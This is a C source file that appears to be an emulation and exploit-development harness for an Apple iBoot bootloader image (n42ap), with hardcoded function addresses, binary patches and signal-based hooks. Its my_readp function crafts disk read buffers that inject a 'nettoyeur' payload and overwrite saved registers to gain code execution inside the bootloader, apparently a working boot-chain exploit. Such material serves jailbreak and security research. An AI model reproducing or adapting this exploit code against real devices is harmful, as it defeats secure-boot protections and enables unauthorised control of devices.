#define IMAGE_NAME              "iBoot.n42ap.RELEASE.dec"
#define IMAGE_START             0xBFF00000
#define IMAGE_END               0xBFF5352C
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA3AD4
#define IMAGE_BSS_START         0xBFF446C0
#define IMAGE_TEXT_END          0xBFF44000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x80000000
#define IMAGE_HUGECHUNK         0x13000000


#define breakpoint1_ADDR        (0x19474 + 1) /* ResolvePathToCatalogEntry */

#define fuck1_ADDR              (0x1A2D6 + 1)
#define fuck2_ADDR              (0x1A2EC + 1)
#define fuck3_ADDR              (0x1A402 + 1)

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CD6 + 1)
#define gpio_pin_state_ADDR     (0x02C34 + 1)
#define gpio_set_state_ADDR     (0x02C54 + 1)
#define get_timer_us_ADDR       (0x01834 + 1)
#define reset_cpu_ADDR          (0x0188C + 1)
#define readp_ADDR              (0x1A09C + 1)
#define get_mem_size_ADDR       (0x1FAB0 + 1)
#define putchar_ADDR            (0x33EEC + 1)
#define adjust_stack_ADDR       (0x1F290 + 1)
#define adjust_environ_ADDR     (0x1F790 + 1)
#define disable_interrupts_ADDR (0x34C2C + 1)
#define cache_stuff_ADDR        (0x227EC + 1)
#define wtf_ADDR                (0x01768 + 1)

#define iboot_warmup_ADDR       (0x00114)
#define iboot_start_ADDR        (0x00BF8 + 1)
#define main_task_ADDR          (0x00C64 + 1)
#define panic_ADDR              (0x20954 + 1)
#define system_init_ADDR        (0x20A40 + 1)
#define task_create_ADDR        (0x21070 + 1)
#define task_start_ADDR         (0x211D0 + 1)
#define task_exit_ADDR          (0x211F4 + 1)
#define printf_ADDR             (0x33754 + 1)
#define malloc_ADDR             (0x1A0B8 + 1)
#define free_ADDR               (0x1A16C + 1)
#define create_envvar_ADDR      (0x189DC + 1)
#define bcopy_ADDR              (0x341D8)
#define decompress_lzss_ADDR    (0x257E0 + 1)


void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
        /* debug */
        BCALL(my_breakpoint1_helper)
        /* replacement insn */
        "ldrb r4, [r11];"
        /* return */
        "bx lr;"
    );
#endif /* __arm__ */
}


#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x47C60 + 0x28 + 32 * 4) {
        unsigned int t2 = (uintptr_t)image + 0x47C60 + 0x28 + r3 * 4;
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
        dumpfile("DUMP_z1");
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x47C60 + 0x28 + 32 * 4) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x40;
        unsigned int t1 = r0 + (r1 << 6);
        unsigned int u4 = ULAT(r2) - 0x40;
        unsigned int u1 = ULAT(r0) + (r1 << 6);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x47C60 + 0x28 + 32 * 4) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "push   {r0-r12};"
        "blx    _real_fuck1;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "add    r6, r4, #0x3f;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r4, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r4;"
        "push   {r0-r12};"
        "blx    _real_fuck2;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "sub    r4, r2, #0x40;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
        "str    r0, [r8];"
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r6, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r6;"
        "push   {r0-r12};"
        "blx    _real_fuck3;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
#if 1
    CALL(malloc)(0xc00 - 64);
#endif
}


void
my_adjust_environ(void)
{
#if 1
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
    dumpfile("DUMP2");
}


int
my_readp(void *ih, void *buffer, long long offset, int length)
{
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
if (1) {
    /* XXX stack recursion eats 208 bytes, watch out for 0x56400 + 0x18 = 0x56418 */
    static int seq = 0;
    switch (seq) {
        case 1:
            memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
            break;
        case 2:
            if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
            PUT_DWORD_LE(buffer, 78,  (uintptr_t)image + 0x47B68);                      /* *r2 = r4 */
            PUT_DWORD_LE(buffer, 0x47B68 + 0x40 - 0x47B54, (uintptr_t)image + 0x47BB1); /* r10 (code exec) */
            PUT_DWORD_LE(buffer, 0x47B68 + 0x44 - 0x47B54, (uintptr_t)image + 0x47CC4); /* r11 -> lr */
            PUT_WORD_LE(buffer,  0x47BB0 +  56 - 0x47B54, INSNT_MOV_R_I(3, nettoyeur_sz));
            PUT_DWORD_LE(buffer, 0x47BB0 +  84 - 0x47B54, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
            PUT_DWORD_LE(buffer, 0x47BB0 +  88 - 0x47B54, (uintptr_t)image /* 0x84000000 */);
            PUT_DWORD_LE(buffer, 0x47BB0 +  92 - 0x47B54, (uintptr_t)image /* 0xbff00000 */);
            PUT_DWORD_LE(buffer, 0x47BB0 + 112 - 0x47B54, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
            PUT_DWORD_LE(buffer, 0x47BB0 + 116 - 0x47B54, (uintptr_t)image + 0x47a7c /* nettoyeur compressed */);
            PUT_DWORD_LE(buffer, 0x47BB0 + 120 - 0x47B54, (uintptr_t)suck_sid /* IMAGE_START + wtf_ADDR */);
            break;
    }
if (seq < 3) {
    int ofd;
    char tmp[256];
    sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
    ofd = creat(tmp, 0644);
    if (ofd >= 0) {
        write(ofd, buffer, length);
        close(ofd);
    }
}
    seq++;
}
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x56400 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
        /* end-of-table */
        { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x20E82)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x210E2)) {
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
            /* ARM handlers: tctx->__pc += 4; */
            uintptr_t addr = (unsigned char *)si_addr - image;
            switch (addr) {
                case wait_for_event_ADDR:
                    my_wait_for_event();
            }
        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
            /* Thumb handlers: tctx->__pc += 2; */
            uintptr_t addr = (unsigned char *)si_addr - image + 1;
            switch (addr) {
                case cache_stuff_ADDR:
                    my_cache_stuff();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case hugechunk_ADDR:
                    tctx->__r[0] = (uint32_t)gethuge();
                    tctx->__pc += 4;
                    return 0;
                case gpio_pin_state_ADDR:
                    tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case gpio_set_state_ADDR:
                    my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_timer_us_ADDR:
                    *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case reset_cpu_ADDR:
                    my_reset_cpu();
                case readp_ADDR:
                    tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_mem_size_ADDR:
                    tctx->__r[0] = my_get_mem_size();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case putchar_ADDR:
                    putchar(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_stack_ADDR:
                    my_adjust_stack();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_environ_ADDR:
                    my_adjust_environ();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case breakpoint1_ADDR:
                    my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
                    tctx->__r[4] = *(unsigned char *)tctx->__r[11];
                    tctx->__pc += 4;
                    return 0;
            }
        }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
        return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x20A4C) = INSN2_LDR_R1_PC__B_PLUS4;
    *(void **)(image + 0x20A50) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
    /* clean data cache */
    *(uint32_t *)(image + 0x223F4) = INSNA_RETURN;
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x20E82) = INSNT_NOP;
    *(uint16_t *)(image + 0x210E2) = INSNT_MOV_R_R(1, 0);
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint32_t *)(image + 0x202B0) = INSN2_RETURN_0;
    /* task switch FPU */
    *(uint32_t *)(image + 0x22830) = INSNA_MOV_R2_0;
    *(uint32_t *)(image + 0x22860) = INSNA_MOV_R2_0;
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x2161C) = INSN2_NOP__NOP;
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BFE) = INSN2_NOP__NOP;
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00C06) = INSN2_NOP__NOP;
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xCE2) = INSN2_NOP__NOP;
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP;
    *(uint32_t *)(image + 0x490) = INSNA_NOP;

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xA98) = INSN2_MOV_R0_1__MOV_R0_1;
    *(uint32_t *)(image + 0x19CD2) = INSN2_MOV_R0_1__MOV_R0_1;

    /* make main_task show SP */
    *(uint16_t *)(image + 0xDBC) = INSNT_MOV_R_R(1, 13);
    *(uint8_t *)(image + 0x34FE4) = 'x';
    /* show task structure */
    *(void **)(image + 0xFCC) = image + 0x443A0;
    *(uint8_t *)(image + 0x34FD0) = 'x';

    /* nop some more hw */
    *(uint32_t *)(image + 0x0C10C) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x01790) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x026DC) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x00D88) = INSN2_NOP__NOP;
    *(uint16_t *)(image + 0x0CA04) = INSNT_NOP; /* XXX loop */
    *(uint16_t *)(image + 0x20432) = INSNT_NOP;
*(uint16_t *)(image + 0x01960) = INSNT_NOP;
    *(uint32_t *)(image + 0x1F9C0) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1FB26) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1FB46) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1FB80) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1FB98) = INSN2_RETURN_21;
    *(uint32_t *)(image + 0x1FBB0) = INSN2_RETURN_0;
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0xEC) = image + *(uint32_t *)(nettoyeur + 0xEC) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xF0) = image + *(uint32_t *)(nettoyeur + 0xF0) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xF4) = image + *(uint32_t *)(nettoyeur + 0xF4) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xF8) = XLAT(*(uint32_t *)(nettoyeur + 0xF8));
}
